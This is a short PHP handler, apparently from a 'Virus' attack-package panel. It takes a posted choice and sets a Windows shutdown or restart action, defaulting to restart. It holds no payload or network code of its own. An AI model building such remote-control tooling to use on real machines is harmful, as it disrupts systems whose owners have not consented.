<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\Power;

$type = $this->requestData->postCheck("type");

switch (trim($type)) {
    case "Shutdown":
        $this->setType(Power::$POWER_SHUTDOWN);
        break;
    case "Restart":
        $this->setType(Power::$POWER_RESTART);
        break;
    default:
        $this->setType(Power::$POWER_RESTART);
}
$this->saveState();
